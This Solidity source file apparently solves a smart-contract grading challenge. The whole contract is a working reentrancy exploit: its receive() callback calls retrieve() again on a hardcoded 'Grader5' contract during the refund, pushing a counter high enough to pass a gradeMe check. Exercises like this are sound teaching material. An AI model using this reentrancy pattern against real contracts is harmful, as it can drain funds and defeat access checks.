// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

/// @title GradeMaster v3 - FIXED VERSION
/// @notice Corrected solution using reentrancy attack
/// @dev Uses the successful strategy proven to work
contract GradeMaster_v3_FIXED {
    /// @notice Target Grader5 contract address
    address public immutable graderAddress;
    
    /// @notice Contract creator for fund recovery
    address public immutable solver;
    
    /// @notice Prevents infinite reentrancy loops
    bool private reentryGuard;
    uint256 private callCount;
    
    /// @notice Emitted when challenge is successfully completed
    event ChallengeSolved(string studentName, uint256 timestamp);
    
    /// @notice Emitted when funds are withdrawn
    event FundsRecovered(uint256 amount);

    /// @dev Initializes with Grader5 address
    constructor() {
        graderAddress = 0x5733eE985e22eFF46F595376d79e31413b1A1e16;
        solver = msg.sender;
    }

    /// @notice Executes the complete solution using reentrancy
    /// @dev CORRECTED: Uses proven reentrancy strategy 
    /// @param yourName The name to register
    /// @notice Requires at least 8 wei for the attack
    function solveChallenge(string calldata yourName) external payable {
        require(msg.value >= 8 wei, "Need at least 8 wei for reentrancy attack");
        require(!reentryGuard, "Already in progress");
        
        reentryGuard = true;
        callCount = 0;
        
        // Single retrieve call - reentrancy happens in receive()
        (bool success, ) = graderAddress.call{value: 4, gas: 300000}(
            abi.encodeWithSignature("retrieve()")
        );
        require(success, "Reentrancy attack failed");
        
        // Verify counter is now > 1
        (bool success2, bytes memory data) = graderAddress.staticcall(
            abi.encodeWithSignature("counter(address)", address(this))
        );
        require(success2, "Counter check failed");
        uint256 currentCounter = abi.decode(data, (uint256));
        require(currentCounter > 1, "Counter not high enough after reentrancy");
        
        // Now gradeMe will work
        string memory decoratedName = string(abi.encodePacked("win", yourName));
        (bool success3, ) = graderAddress.call{gas: 200000}(
            abi.encodeWithSignature("gradeMe(string)", decoratedName)
        );
        require(success3, "Grade registration failed");
        
        reentryGuard = false;
        
        emit ChallengeSolved(decoratedName, block.timestamp);
        
        // Return any remaining ETH
        if (address(this).balance > 0) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    /// @notice CRITICAL: This enables the reentrancy attack
    /// @dev Called when Grader5 sends ETH back during retrieve()
    receive() external payable {
        if (!reentryGuard) return;
        
        callCount++;
        
        // Only do one reentrancy call to avoid infinite loops
        if (callCount == 1 && address(graderAddress).balance >= 4) {
            // This is the KEY: second retrieve() call during callback
            graderAddress.call{value: 4, gas: gasleft()}(
                abi.encodeWithSignature("retrieve()")
            );
        }
    }

    /// @notice Allows solver to recover funds
    function recoverFunds() external {
        require(msg.sender == solver, "Only solver can recover");
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds available");
        
        (bool sent, ) = payable(solver).call{value: balance}("");
        require(sent, "Transfer failed");
        
        emit FundsRecovered(balance);
    }

    /// @notice Check current counter value (for debugging)
    function checkCounter() external view returns (uint256) {
        (bool success, bytes memory data) = graderAddress.staticcall(
            abi.encodeWithSignature("counter(address)", address(this))
        );
        require(success, "Counter check failed");
        return abi.decode(data, (uint256));
    }
}